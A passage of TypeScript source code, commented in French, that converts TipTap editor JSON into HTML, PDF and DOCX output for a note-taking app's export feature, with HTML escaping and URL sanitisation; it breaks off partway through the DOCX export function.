    case 'fileEmbed': {
      const { name, src, isImage } = fileEmbedInfo(node);
      const width = node.attrs?.width;
      // `allowData` : une pièce jointe embarquée EST une data-URI.
      const safeSrc = safeUrl(src, true);
      if (isImage && safeSrc) {
        const w = typeof width === 'number' && width > 0 ? ` width="${width}"` : '';
        return `<img src="${escapeHtml(safeSrc)}" alt="${escapeHtml(name)}"${w}>`;
      }
      if (safeSrc)
        return `<p class="file-embed"><a href="${escapeHtml(safeSrc)}">${escapeHtml(name)}</a></p>`;
      return `<p class="file-embed">Attachment: ${escapeHtml(name)}</p>`;
    }

    // Voir la note du même `case` côté Markdown : nœud hors schéma, produit
    // par l'importateur HTML, que l'export doit savoir relire.
    case 'image': {
      const src = safeUrl(attrStr(node, 'src'), true);
      const alt = escapeHtml(attrStr(node, 'alt'));
      if (!src) return alt ? `<p class="image">${alt}</p>` : '';
      return `<img src="${escapeHtml(src)}" alt="${alt}">`;
    }

    case 'bookmark': {
      const url = attrStr(node, 'url');
      const title = attrStr(node, 'title') || attrStr(node, 'domain') || url;
      const description = attrStr(node, 'description');
      const body = `<strong>${escapeHtml(title)}</strong>${description ? `<br><span>${escapeHtml(description)}</span>` : ''}`;
      const href = safeUrl(url);
      return href
        ? `<p><a class="bookmark" href="${escapeHtml(href)}">${body}</a></p>`
        : `<p class="bookmark">${body}</p>`;
    }

    case 'embedUrl': {
      const url = attrStr(node, 'url');
      const title = attrStr(node, 'title') || url;
      // Pas d'<iframe> : un export HTML doit rester lisible hors ligne et ne
      // pas rappeler un tiers à l'ouverture. Un lien nommé dit tout.
      const href = safeUrl(url);
      return href
        ? `<p class="embed"><a href="${escapeHtml(href)}">${escapeHtml(title)}</a></p>`
        : `<p class="embed">${escapeHtml(title)}</p>`;
    }

    case 'subPage': {
      const icon = attrStr(node, 'icon');
      const title = attrStr(node, 'title') || attrStr(node, 'noteId');
      return `<p class="sub-page">${icon ? `${escapeHtml(icon)} ` : ''}<strong>${escapeHtml(title)}</strong></p>`;
    }

    case 'transclusion': {
      const preview = attrStr(node, 'preview');
      return `<blockquote class="transclusion"><p><em>${escapeHtml(transclusionRef(node))}</em></p>${preview ? `\n<p>${escapeHtml(preview)}</p>` : ''}</blockquote>`;
    }

    case 'tableOfContents':
      return `<p class="toc"><em>Table of Contents</em></p>`;

    case 'calendarBlock': {
      const title = attrStr(node, 'title');
      const events = calendarEvents(node);
      const head = `<p class="calendar-title"><strong>Calendar${title ? `: ${escapeHtml(title)}` : ''}</strong></p>`;
      if (events.length === 0) return head;
      const items = events
        .map(
          (e) =>
            `<li><time datetime="${escapeHtml(e.date)}">${escapeHtml(e.date)}</time> ${escapeHtml(e.text)}</li>`
        )
        .join('\n');
      return `${head}\n<ul class="calendar">\n${items}\n</ul>`;
    }

    case 'inlineDatabase': {
      const db = parseDbData(String(node.attrs?.data ?? ''));
      if (db.properties.length === 0) return '';
      const head = `<tr>${db.properties.map((p) => `<th>${escapeHtml(p.name)}</th>`).join('')}</tr>`;
      const body = db.rows
        .map(
          (r) =>
            `<tr>${db.properties
              .map((p) => `<td>${escapeHtml(dbRowCellText(p, r, db.properties))}</td>`)
              .join('')}</tr>`
        )
        .join('\n');
      const title = (node.attrs?.title as string) || '';
      return (
        (title ? `<p><strong>${escapeHtml(title)}</strong></p>\n` : '') +
        `<table>\n<thead>${head}</thead>\n<tbody>\n${body}\n</tbody>\n</table>`
      );
    }

    case 'text':
    case 'hardBreak':
    case 'mathInline':
    case 'footnote':
    case 'inlineDate':
    case 'mention':
      return inlineContentToHtml([node]);

    default:
      if (node.content) return (node.content || []).map(nodeToHtml).join('\n');
      return node.text ? escapeHtml(node.text) : '';
  }
}

// ==================== TipTap JSON → PDF lines ====================

interface PdfLine {
  text: string;
  fontSize: number;
  fontStyle: 'normal' | 'bold' | 'italic' | 'bolditalic';
  indent: number;
  spaceBefore?: number;
}

/**
 * Substitut PDF d'un bloc atomique : une ligne d'étiquette en gras, puis le
 * contenu en petit. Le PDF de ce service est un flux de lignes (jsPDF sans
 * moteur de rendu HTML) — il ne dessinera jamais un diagramme, mais il peut
 * porter sa source, ce qui laisse le document RELISIBLE.
 */
function atomToPdfLines(node: TipTapNode, indent: number): PdfLine[] {
  const { label, body } = atomFallback(node);
  const lines: PdfLine[] = [
    { text: label, fontSize: 10, fontStyle: 'bold', indent, spaceBefore: 4 },
  ];
  for (const raw of body) {
    if (raw.trim() === '') continue;
    lines.push({ text: raw, fontSize: 9, fontStyle: 'normal', indent: indent + 8 });
  }
  return lines;
}

function nodeToPdfLines(node: TipTapNode, indent: number = 0): PdfLine[] {
  const lines: PdfLine[] = [];

  switch (node.type) {
    case 'doc':
      for (const child of node.content || []) {
        lines.push(...nodeToPdfLines(child, indent));
      }
      break;

    case 'paragraph':
      lines.push({
        text: inlineContentToMd(node.content),
        fontSize: 11,
        fontStyle: 'normal',
        indent,
      });
      break;

    case 'heading': {
      const level = (node.attrs?.level as number) || 1;
      const sizes: Record<number, number> = { 1: 18, 2: 15, 3: 13, 4: 12 };
      lines.push({
        text: inlineContentToMd(node.content),
        fontSize: sizes[level] || 12,
        fontStyle: 'bold',
        indent,
        spaceBefore: 6,
      });
      break;
    }

    case 'bulletList':
    case 'taskList':
      for (const item of node.content || []) {
        lines.push(...nodeToPdfLines(item, indent));
      }
      break;

    case 'orderedList':
      (node.content || []).forEach((item, i) => {
        const start = ((node.attrs?.start as number) || 1) + i;
        const itemLines = nodeToPdfLines(item, indent);
        if (itemLines.length > 0) {
          itemLines[0].text = `${start}. ${itemLines[0].text.replace(/^[-•] /, '')}`;
        }
        lines.push(...itemLines);
      });
      break;

    case 'listItem':
      for (const child of node.content || []) {
        const childLines = nodeToPdfLines(child, indent + 8);
        if (childLines.length > 0) {
          childLines[0].text = `• ${childLines[0].text}`;
        }
        lines.push(...childLines);
      }
      break;

    case 'taskItem': {
      const checked = node.attrs?.checked ? '☑' : '☐';
      for (const child of node.content || []) {
        const childLines = nodeToPdfLines(child, indent + 8);
        if (childLines.length > 0) {
          childLines[0].text = `${checked} ${childLines[0].text}`;
        }
        lines.push(...childLines);
      }
      break;
    }

    case 'codeBlock': {
      const code = (node.content || []).map((c) => c.text || '').join('');
      for (const codeLine of code.split('\n')) {
        lines.push({ text: codeLine, fontSize: 9, fontStyle: 'normal', indent: indent + 4 });
      }
      break;
    }

    case 'blockquote':
      for (const child of node.content || []) {
        const childLines = nodeToPdfLines(child, indent + 10);
        for (const cl of childLines) {
          cl.fontStyle = 'italic';
        }
        lines.push(...childLines);
      }
      break;

    case 'horizontalRule':
      lines.push({ text: '────────────────────────', fontSize: 10, fontStyle: 'normal', indent });
      break;

    /**
     * TABLEAU. Sans ce `case`, le `default` descendait dans les cellules et
     * rendait chacune comme un paragraphe : les LIGNES du tableau étaient
     * dissoutes. Une ligne « a | b | c » n'est pas une grille, mais elle
     * préserve l'appariement des cellules, qui est l'information.
     */
    case 'table': {
      const rows = tableToTextRows(node);
      rows.forEach((cells, i) => {
        lines.push({
          text: cells.join(' | '),
          fontSize: 10,
          // La première ligne d'un tableau TipTap porte les en-têtes.
          fontStyle: i === 0 ? 'bold' : 'normal',
          indent,
          spaceBefore: i === 0 ? 4 : undefined,
        });
      });
      break;
    }

    case 'tableRow':
      lines.push({
        text: (node.content || [])
          .map((cell) =>
            (cell.content || [])
              .map((c) => inlineContentToMd(c.content))
              .join(' ')
              .trim()
          )
          .join(' | '),
        fontSize: 10,
        fontStyle: 'normal',
        indent,
      });
      break;

    case 'tableCell':
    case 'tableHeader':
      for (const child of node.content || []) {
        lines.push(...nodeToPdfLines(child, indent));
      }
      break;

    case 'callout': {
      const type = attrStr(node, 'type') || 'info';
      const title = attrStr(node, 'title');
      lines.push({
        text: `[${type.toUpperCase()}]${title ? ` ${title}` : ''}`,
        fontSize: 10,
        fontStyle: 'bold',
        indent,
        spaceBefore: 4,
      });
      for (const child of node.content || []) {
        lines.push(...nodeToPdfLines(child, indent + 8));
      }
      break;
    }

    // Colonnes : le PDF est un flux vertical, elles se suivent — mais chaque
    // colonne est ANNONCÉE, sinon deux colonnes fusionnent en un seul texte.
    case 'columns': {
      const cols = (node.content || []).filter((c) => c.type === 'column');
      cols.forEach((col, i) => {
        lines.push({
          text: `Column ${i + 1} of ${cols.length}`,
          fontSize: 9,
          fontStyle: 'bold',
          indent,
          spaceBefore: 4,
        });
        for (const child of col.content || []) {
          lines.push(...nodeToPdfLines(child, indent + 8));
        }
      });
      break;
    }

    case 'column':
      for (const child of node.content || []) {
        lines.push(...nodeToPdfLines(child, indent));
      }
      break;

    case 'toggleBlock': {
      const children = node.content || [];
      const summaryNode = children.find((c) => c.type === 'toggleSummary');
      lines.push({
        // Un PDF ne se replie pas : le contenu du volet est TOUJOURS rendu,
        // sinon un export « propre » perdrait tout ce qui était fermé.
        text: `▸ ${summaryNode ? inlineContentToMd(summaryNode.content) : ''}`,
        fontSize: 11,
        fontStyle: 'bold',
        indent,
        spaceBefore: 4,
      });
      for (const child of children) {
        if (child === summaryNode) continue;
        lines.push(...nodeToPdfLines(child, indent + 8));
      }
      break;
    }

    case 'toggleSummary':
      lines.push({
        text: inlineContentToMd(node.content),
        fontSize: 11,
        fontStyle: 'bold',
        indent,
      });
      break;

    // Nœud hors schéma produit par l'importateur HTML (cf. `case 'image'` du
    // sérialiseur Markdown).
    case 'image':
      lines.push({
        text: `Image: ${attrStr(node, 'alt') || attrStr(node, 'src').slice(0, 60) || 'image'}`,
        fontSize: 9,
        fontStyle: 'italic',
        indent,
      });
      break;

    // Blocs atomiques : tout leur contenu vit dans `attrs`, donc le `default`
    // n'en rendait STRICTEMENT RIEN. Substitut commun avec le DOCX.
    case 'mathBlock':
    case 'mermaidBlock':
    case 'dataviewBlock':
    case 'tableOfContents':
    case 'bookmark':
    case 'embedUrl':
    case 'fileEmbed':
    case 'subPage':
    case 'transclusion':
    case 'calendarBlock':
      lines.push(...atomToPdfLines(node, indent));
      break;

    case 'inlineDatabase': {
      // Une ligne de texte par row (valeurs résolues, séparées par |)
      const db = parseDbData(String(node.attrs?.data ?? ''));
      if (db.properties.length === 0) break;
      const title = (node.attrs?.title as string) || '';
      if (title) {
        lines.push({ text: title, fontSize: 12, fontStyle: 'bold', indent, spaceBefore: 4 });
      }
      lines.push({
        text: db.properties.map((p) => p.name).join(' | '),
        fontSize: 10,
        fontStyle: 'bold',
        indent,
      });
      for (const r of db.rows) {
        lines.push({
          text: db.properties.map((p) => dbRowCellText(p, r, db.properties)).join(' | '),
          fontSize: 10,
          fontStyle: 'normal',
          indent,
        });
      }
      break;
    }

    case 'text':
    case 'hardBreak':
    case 'mathInline':
    case 'footnote':
    case 'inlineDate':
    case 'mention':
      lines.push({ text: inlineContentToMd([node]), fontSize: 11, fontStyle: 'normal', indent });
      break;

    default:
      if (node.content) {
        for (const child of node.content) {
          lines.push(...nodeToPdfLines(child, indent));
        }
      } else if (node.text) {
        lines.push({ text: node.text, fontSize: 11, fontStyle: 'normal', indent });
      }
  }

  return lines;
}

// ==================== TipTap JSON → DOCX ====================

/**
 * Représentation INTERMÉDIAIRE du DOCX.
 *
 * `docx` construit des objets opaques (`Paragraph`, `TextRun`) dont on ne peut
 * plus relire le texte : impossible d'éprouver le sérialiseur autrement qu'en
 * empaquetant un vrai .docx et en le dézippant. On sérialise donc d'abord vers
 * des données PLATES — testables, comparables — puis on les traduit en objets
 * `docx` d'un seul geste (`docxParagraph`).
 */
interface DocxRun {
  text: string;
  bold?: boolean;
  italics?: boolean;
  strike?: boolean;
  underline?: boolean;
  /** Rendu en chasse fixe (marque `code`, blocs de code, formules). */
  mono?: boolean;
  /** Couleur RRGGBB, sans dièse — seule forme acceptée par docx. */
  color?: string;
  highlight?: (typeof HighlightColor)[keyof typeof HighlightColor];
  /** Demi-points : 22 = 11 pt, la taille de corps de ce service. */
  size?: number;
  /** Saut de ligne AVANT le texte (nœud `hardBreak`). */
  lineBreak?: boolean;
}

interface DocxBlock {
  runs: DocxRun[];
  /** Niveau de titre 1..4, quand le bloc est un titre. */
  heading?: number;
  /** Retrait gauche, en twips (360 = 0,25 pouce). */
  indentLeft?: number;
  center?: boolean;
}

const DOCX_BODY_SIZE = 22;
const DOCX_SMALL_SIZE = 18;
/** Bleu de lien Word, pour que les liens ne soient pas indiscernables du texte. */
const DOCX_LINK_COLOR = '0563C1';

/**
 * Couleur CSS → RRGGBB. Word n'accepte QUE l'hexadécimal : une couleur nommée
 * (`red`) ou fonctionnelle (`rgb(...)`) est ignorée plutôt que recopiée telle
 * quelle, ce qui produirait un document invalide.
 */
function docxColor(value: unknown): string | undefined {
  if (typeof value !== 'string') return undefined;
  const hex = value.trim().replace(/^#/, '');
  if (/^[0-9a-fA-F]{6}$/.test(hex)) return hex.toUpperCase();
  if (/^[0-9a-fA-F]{3}$/.test(hex)) {
    return hex
      .split('')
      .map((c) => c + c)
      .join('')
      .toUpperCase();
  }
  return undefined;
}

/** `font-size: 14px` → demi-points Word. Une valeur non exploitable = corps. */
function docxSize(value: unknown): number | undefined {
  if (typeof value !== 'string') return undefined;
  const match = /^(\d+(?:\.\d+)?)\s*(px|pt|em|rem)?$/.exec(value.trim());
  if (!match) return undefined;
  const n = Number.parseFloat(match[1]);
  if (!Number.isFinite(n) || n <= 0) return undefined;
  const unit = match[2] || 'px';
  // 1 px ≈ 0,75 pt ; 1 em ≈ 16 px. Le résultat est en DEMI-points.
  const points = unit === 'pt' ? n : unit === 'px' ? n * 0.75 : n * 12;
  return Math.max(2, Math.round(points * 2));
}

function docxRunsFromInline(nodes?: TipTapNode[]): DocxRun[] {
  if (!nodes) return [];
  const runs: DocxRun[] = [];
  for (const node of nodes) {
    switch (node.type) {
      case 'text': {
        const marks = node.marks || [];
        const has = (...names: string[]) => marks.some((m) => names.includes(m.type));
        const textStyle = marks.find((m) => m.type === 'textStyle');
        const link = marks.find((m) => m.type === 'link');
        const isLink = !!link;
        runs.push({
          text: node.text || '',
          bold: has('bold', 'strong') || undefined,
          italics: has('italic', 'em') || undefined,
          strike: has('strike') || undefined,
          // Un lien souligné bleu : c'est la convention Word, et sans elle le
          // lien devient invisible (le DOCX de ce service n'embarque pas de
          // relation d'hyperlien, l'URL est rendue juste après).
          underline: has('underline') || isLink || undefined,
          mono: has('code') || undefined,
          color: isLink ? DOCX_LINK_COLOR : docxColor(textStyle?.attrs?.color),
          highlight: has('highlight') ? HighlightColor.YELLOW : undefined,
          size: docxSize(textStyle?.attrs?.fontSize) ?? DOCX_BODY_SIZE,
        });
        // L'URL est écrite APRÈS le texte lorsqu'elle ne s'y trouve pas déjà :
        // un lien non cliquable dont l'adresse a disparu est une perte sèche.
        const href = typeof link?.attrs?.href === 'string' ? link.attrs.href : '';
        if (href && href !== node.text) {
          runs.push({ text: ` (${href})`, size: DOCX_SMALL_SIZE, color: DOCX_LINK_COLOR });
        }
        break;
      }
      case 'hardBreak':
        runs.push({ text: '', lineBreak: true });
        break;
      case 'mathInline':
        runs.push({ text: `$${attrStr(node, 'latex')}$`, mono: true, size: DOCX_BODY_SIZE });
        break;
      case 'footnote':
        runs.push({
          text: ` [${attrStr(node, 'content')}]`,
          size: DOCX_SMALL_SIZE,
          italics: true,
        });
        break;
      case 'inlineDate':
        runs.push({ text: attrStr(node, 'date'), size: DOCX_BODY_SIZE });
        break;
      case 'mention':
        runs.push({ text: `@${attrStr(node, 'label')}`, size: DOCX_BODY_SIZE });
        break;
      default:
        if (node.content) runs.push(...docxRunsFromInline(node.content));
    }
  }
  return runs;
}

/** Une ligne de texte simple — le motif le plus fréquent des substituts. */
function docxLine(text: string, indentLeft: number, style: Partial<DocxRun> = {}): DocxBlock {
  return { runs: [{ text, size: DOCX_BODY_SIZE, ...style }], indentLeft: indentLeft || undefined };
}

/** Substitut DOCX d'un bloc atomique — même contenu que le PDF. */
function atomToDocxBlocks(node: TipTapNode, indent: number): DocxBlock[] {
  const { label, body } = atomFallback(node);
  const blocks: DocxBlock[] = [docxLine(label, indent * 360, { bold: true })];
  for (const raw of body) {
    if (raw.trim() === '') continue;
    blocks.push(docxLine(raw, (indent + 1) * 360, { size: DOCX_SMALL_SIZE }));
  }
  return blocks;
}

function nodeToDocxBlocks(node: TipTapNode, indent: number = 0): DocxBlock[] {
  const blocks: DocxBlock[] = [];

  switch (node.type) {
    case 'doc':
      for (const child of node.content || []) {
        blocks.push(...nodeToDocxBlocks(child, indent));
      }
      break;

    case 'paragraph':
      blocks.push({
        runs: docxRunsFromInline(node.content),
        indentLeft: indent > 0 ? indent * 360 : undefined,
      });
      break;

    case 'heading':
      blocks.push({
        runs: docxRunsFromInline(node.content),
        heading: (node.attrs?.level as number) || 1,
      });
      break;

    case 'bulletList':
    case 'taskList':
      for (const item of node.content || []) {
        blocks.push(...nodeToDocxBlocks(item, indent));
      }
      break;

    case 'orderedList':
      (node.content || []).forEach((item, i) => {
        const num = ((node.attrs?.start as number) || 1) + i;
        for (const child of item.content || []) {
          const runs = docxRunsFromInline(child.content);
          runs.unshift({ text: `${num}. `, bold: true, size: DOCX_BODY_SIZE });
          blocks.push({ runs, indentLeft: (indent + 1) * 360 });
        }
      });
      break;

    case 'listItem':
      for (const child of node.content || []) {
        const runs = docxRunsFromInline(child.content);
        runs.unshift({ text: '• ', size: DOCX_BODY_SIZE });
        blocks.push({ runs, indentLeft: (indent + 1) * 360 });
      }
      break;

    case 'taskItem': {
      const checked = node.attrs?.checked ? '☑ ' : '☐ ';
      for (const child of node.content || []) {
        const runs = docxRunsFromInline(child.content);
        runs.unshift({ text: checked, size: DOCX_BODY_SIZE });
        blocks.push({ runs, indentLeft: (indent + 1) * 360 });
      }
      break;
    }

    case 'codeBlock': {
      const code = (node.content || []).map((c) => c.text || '').join('');
      for (const line of code.split('\n')) {
        blocks.push(docxLine(line, 360, { mono: true, size: DOCX_SMALL_SIZE }));
      }
      break;
    }

    /**
     * La citation garde désormais SES marques : l'ancienne version fabriquait
     * les runs, les jetait, puis réécrivait le texte à plat via `.slice(0, 1)`
     * — gras, liens et sauts de ligne de la citation disparaissaient.
     */
    case 'blockquote':
      for (const child of node.content || []) {
        const runs = docxRunsFromInline(child.content).map((r) => ({ ...r, italics: true }));
        blocks.push({
          runs: [{ text: '│ ', color: '888888', size: DOCX_BODY_SIZE }, ...runs],
          indentLeft: 360,
        });
      }
      break;

    case 'horizontalRule':
      blocks.push({
        runs: [{ text: '─'.repeat(50), color: 'CCCCCC', size: DOCX_SMALL_SIZE }],
        center: true,
      });
      break;

    case 'table': {
      const rows = tableToTextRows(node);
      rows.forEach((cells, i) => {
        blocks.push(
          docxLine(cells.join(' | '), indent * 360, {
            bold: i === 0 || undefined,
            size: DOCX_BODY_SIZE,
          })
        );
      });
      break;
    }

    case 'tableRow':
      blocks.push(
        docxLine(
          (node.content || [])
            .map((cell) =>
              (cell.content || [])
                .map((c) => inlineContentToMd(c.content))
                .join(' ')
                .trim()
            )
            .join(' | '),
          indent * 360
        )
      );
      break;

    case 'tableCell':
    case 'tableHeader':
      for (const child of node.content || []) {
        blocks.push(...nodeToDocxBlocks(child, indent));
      }
      break;

    case 'callout': {
      const type = attrStr(node, 'type') || 'info';
      const title = attrStr(node, 'title');
      blocks.push(
        docxLine(`[${type.toUpperCase()}]${title ? ` ${title}` : ''}`, indent * 360, { bold: true })
      );
      for (const child of node.content || []) {
        blocks.push(...nodeToDocxBlocks(child, indent + 1));
      }
      break;
    }

    case 'columns': {
      const cols = (node.content || []).filter((c) => c.type === 'column');
      cols.forEach((col, i) => {
        blocks.push(
          docxLine(`Column ${i + 1} of ${cols.length}`, indent * 360, {
            bold: true,
            size: DOCX_SMALL_SIZE,
          })
        );
        for (const child of col.content || []) {
          blocks.push(...nodeToDocxBlocks(child, indent + 1));
        }
      });
      break;
    }

    case 'column':
      for (const child of node.content || []) {
        blocks.push(...nodeToDocxBlocks(child, indent));
      }
      break;

    case 'toggleBlock': {
      const children = node.content || [];
      const summaryNode = children.find((c) => c.type === 'toggleSummary');
      blocks.push({
        runs: [
          { text: '▸ ', size: DOCX_BODY_SIZE },
          ...docxRunsFromInline(summaryNode?.content).map((r) => ({ ...r, bold: true })),
        ],
        indentLeft: indent > 0 ? indent * 360 : undefined,
      });
      for (const child of children) {
        if (child === summaryNode) continue;
        blocks.push(...nodeToDocxBlocks(child, indent + 1));
      }
      break;
    }

    case 'toggleSummary':
      blocks.push({
        runs: docxRunsFromInline(node.content).map((r) => ({ ...r, bold: true })),
        indentLeft: indent > 0 ? indent * 360 : undefined,
      });
      break;

    // Nœud hors schéma produit par l'importateur HTML.
    case 'image':
      blocks.push(
        docxLine(
          `Image: ${attrStr(node, 'alt') || attrStr(node, 'src').slice(0, 60) || 'image'}`,
          indent * 360,
          { italics: true, size: DOCX_SMALL_SIZE }
        )
      );
      break;

    case 'mathBlock':
    case 'mermaidBlock':
    case 'dataviewBlock':
    case 'tableOfContents':
    case 'bookmark':
    case 'embedUrl':
    case 'fileEmbed':
    case 'subPage':
    case 'transclusion':
    case 'calendarBlock':
      blocks.push(...atomToDocxBlocks(node, indent));
      break;

    case 'inlineDatabase': {
      // Titre + une ligne de texte par row (mêmes valeurs résolues que MD/HTML/PDF)
      const db = parseDbData(String(node.attrs?.data ?? ''));
      if (db.properties.length === 0) break;
      const title = (node.attrs?.title as string) || '';
      if (title) blocks.push(docxLine(title, 0, { bold: true }));
      blocks.push(docxLine(db.properties.map((p) => p.name).join(' | '), 0, { bold: true }));
      for (const r of db.rows) {
        blocks.push(
          docxLine(db.properties.map((p) => dbRowCellText(p, r, db.properties)).join(' | '), 0)
        );
      }
      break;
    }

    case 'text':
    case 'hardBreak':
    case 'mathInline':
    case 'footnote':
    case 'inlineDate':
    case 'mention':
      blocks.push({
        runs: docxRunsFromInline([node]),
        indentLeft: indent > 0 ? indent * 360 : undefined,
      });
      break;

    default:
      if (node.content) {
        for (const child of node.content) {
          blocks.push(...nodeToDocxBlocks(child, indent));
        }
      } else if (node.text) {
        blocks.push(docxLine(node.text, 0));
      }
  }

  return blocks;
}

const DOCX_HEADINGS: Record<number, (typeof HeadingLevel)[keyof typeof HeadingLevel]> = {
  1: HeadingLevel.HEADING_1,
  2: HeadingLevel.HEADING_2,
  3: HeadingLevel.HEADING_3,
  4: HeadingLevel.HEADING_4,
};

/** Traduction finale : données plates → objets `docx`. Aucune décision ici. */
function docxParagraph(block: DocxBlock): Paragraph {
  return new Paragraph({
    children: block.runs.map(
      (r) =>
        new TextRun({
          text: r.text,
          bold: r.bold || undefined,
          italics: r.italics || undefined,
          strike: r.strike || undefined,
          underline: r.underline ? {} : undefined,
          font: r.mono ? 'Courier New' : undefined,
          color: r.color,
          highlight: r.highlight,
          size: r.size ?? DOCX_BODY_SIZE,
          break: r.lineBreak ? 1 : undefined,
        })
    ),
    heading: block.heading ? DOCX_HEADINGS[block.heading] || HeadingLevel.HEADING_4 : undefined,
    indent: block.indentLeft ? { left: block.indentLeft } : undefined,
    alignment: block.center ? AlignmentType.CENTER : undefined,
  });
}

function nodeToDocxParagraphs(node: TipTapNode, indent: number = 0): Paragraph[] {
  return nodeToDocxBlocks(node, indent).map(docxParagraph);
}

// ==================== Export Functions ====================

/**
 * Export note to Markdown format.
 */
export function exportToMarkdown(note: Note, options?: ExportOptions): ExportResult {
  let md = `# ${note.title || 'Untitled'}\n\n`;

  if (options?.includeMetadata) {
    md += `---\n`;
    md += `created: ${note.createdAt}\n`;
    md += `modified: ${note.updatedAt}\n`;
    md += `words: ${note.wordCount}\n`;
    if (note.isDaily) md += `daily: ${note.dailyDate}\n`;
    md += `---\n\n`;
  }

  const doc = parseTipTapContent(note.content);
  if (doc) {
    md += nodeToMarkdown(doc);
  } else {
    md += note.plainText || '';
  }

  if (options?.includeLinks && note.linkedNoteIds.length > 0) {
    md += `\n\n## Linked Notes\n\n`;
    for (const id of note.linkedNoteIds) {
      md += `- [[${id}]]\n`;
    }
  }

  const blob = new Blob([md], { type: 'text/markdown;charset=utf-8' });
  return {
    blob,
    filename: `${sanitizeFilename(note.title)}.md`,
    mimeType: 'text/markdown',
  };
}

/**
 * Export note to HTML format.
 */
export function exportToHTML(note: Note, options?: ExportOptions): ExportResult {
  const doc = parseTipTapContent(note.content);
  const bodyHtml = doc ? nodeToHtml(doc) : `<p>${escapeHtml(note.plainText || '')}</p>`;

  let html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${escapeHtml(note.title || 'Untitled')}</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 700px; margin: 40px auto; padding: 0 20px; color: #333; line-height: 1.7; }
    h1 { font-size: 2rem; margin-bottom: 0.5em; }
    h2 { font-size: 1.5rem; }
    h3 { font-size: 1.25rem; }
    .meta { color: #888; font-size: 0.85rem; margin-bottom: 2em; }
    p { margin: 0.5em 0; }
    pre { background: #f5f5f5; padding: 1em; border-radius: 6px; overflow-x: auto; }
    code { background: #f0f0f0; padding: 0.15em 0.3em; border-radius: 3px; font-size: 0.9em; }
    pre code { background: none; padding: 0; }
    blockquote { border-left: 3px solid #ddd; margin: 1em 0; padding-left: 1em; color: #666; }
    table { border-collapse: collapse; width: 100%; margin: 1em 0; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    th { background: #f5f5f5; font-weight: 600; }
    .task-list { list-style: none; padding-left: 0; }
    .task-item { display: flex; align-items: baseline; gap: 0.5em; }
    mark { padding: 0.1em 0.2em; border-radius: 2px; }
    hr { border: none; border-top: 1px solid #ddd; margin: 2em 0; }
    img { max-width: 100%; height: auto; }
    .callout { border-left: 4px solid #4682B4; background: #f0f7ff; padding: 1em; margin: 1em 0; border-radius: 4px; }
    .callout-title { margin-top: 0; }
    /* Colonnes : HTML est le seul format d'export qui les rend telles quelles. */
    .columns { display: flex; gap: 1.5em; margin: 1em 0; align-items: flex-start; }
    .column { flex: 1 1 0; min-width: 0; }
    @media (max-width: 640px) { .columns { display: block; } }
    details { margin: 1em 0; border: 1px solid #eee; border-radius: 4px; padding: 0.5em 0.8em; }
    summary { cursor: pointer; font-weight: 600; }
    .transclusion { border-left: 3px solid #4682B4; background: #f7fbff; padding: 0.5em 1em; }
    .bookmark { display: block; border: 1px solid #ddd; border-radius: 6px; padding: 0.8em; text-decoration: none; color: inherit; }
    .file-embed, .toc, .embed, .sub-page { color: #555; }
    .math-block { background: #f7f7fb; }
    .footnote { color: #666; font-size: 0.8em; }
    .calendar { margin-top: 0.3em; }
  </style>
</head>
<body>
  <h1>${escapeHtml(note.title || 'Untitled')}</h1>`;

  if (options?.includeMetadata) {
    html += `\n  <div class="meta">
    Created: ${new Date(note.createdAt).toLocaleDateString()} |
    Modified: ${new Date(note.updatedAt).toLocaleDateString()} |
    ${note.wordCount} words
  </div>`;
  }

  html += `\n  ${bodyHtml}`;
  html += `\n</body>\n</html>`;

  const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
  return {
    blob,
    filename: `${sanitizeFilename(note.title)}.html`,
    mimeType: 'text/html',
  };
}

/**
 * Export note to PDF format.
 */
export function exportToPDF(note: Note, options?: ExportOptions): ExportResult {
  const pdf = new jsPDF();
  const pageWidth = pdf.internal.pageSize.getWidth();
  const margin = 20;
  const maxWidth = pageWidth - margin * 2;
  let y = 25;

  const ensureSpace = (needed: number) => {
    if (y + needed > pdf.internal.pageSize.getHeight() - 20) {
      pdf.addPage();
      y = 20;
    }
  };

  // Title
  pdf.setFontSize(20);
  pdf.setFont('helvetica', 'bold');
  const titleLines = pdf.splitTextToSize(note.title || 'Untitled', maxWidth);
  pdf.text(titleLines, margin, y);
  y += titleLines.length * 8 + 5;

  // Metadata
  if (options?.includeMetadata) {
    pdf.setFontSize(9);
    pdf.setFont('helvetica', 'normal');
    pdf.setTextColor(128);
    pdf.text(
      `Created: ${new Date(note.createdAt).toLocaleDateString()} | Modified: ${new Date(note.updatedAt).toLocaleDateString()} | ${note.wordCount} words`,
      margin,
      y
    );
    y += 10;
    pdf.setTextColor(0);
  }

  // Body — use TipTap JSON for rich structure
  const doc = parseTipTapContent(note.content);
  const pdfLines = doc
    ? nodeToPdfLines(doc)
    : [{ text: note.plainText || '', fontSize: 11, fontStyle: 'normal' as const, indent: 0 }];

  for (const line of pdfLines) {
    if (line.spaceBefore) y += line.spaceBefore;

    pdf.setFontSize(line.fontSize);
    pdf.setFont('helvetica', line.fontStyle === 'bolditalic' ? 'bolditalic' : line.fontStyle);

    const offsetX = margin + (line.indent || 0);
    const availableWidth = maxWidth - (line.indent || 0);
    const wrapped = pdf.splitTextToSize(line.text || '', availableWidth);
    const lineHeight = line.fontSize * 0.5;

    for (const wl of wrapped) {
      ensureSpace(lineHeight);
      pdf.text(wl, offsetX, y);
      y += lineHeight;
    }
    y += 1; // small gap between blocks
  }

  const blob = pdf.output('blob');
  return {
    blob,
    filename: `${sanitizeFilename(note.title)}.pdf`,
    mimeType: 'application/pdf',
  };
}

/**
 * Export note to DOCX format.
 */
export async function exportToDOCX(note: Note, options?: ExportOptions): Promise<ExportResult> {
  const children: Paragraph[] = [];

  // Title
  children.push(
    new Paragraph({
      text: note.title || 'Untitled',
      heading: HeadingLevel.HEADING_1,
    })
  );

  // Metadata
  if (options?.includeMetadata) {
    children.push(
      new Paragraph({
        children: [
          new TextRun({
            text: `Created: ${new Date(note.createdAt).toLocaleDateString()} | Modified: ${new Date(note.updatedAt).toLocaleDateString()} | ${note.wordCount} words`,
            size: 18,
            color: '888888',
            italics: true,
          }),
        ],
      })
    );
    children.push(new Paragraph({ text: '' }));
  }

  // Body — use TipTap JSON for rich structure
  const tipTapDoc = parseTipTapContent(note.content);
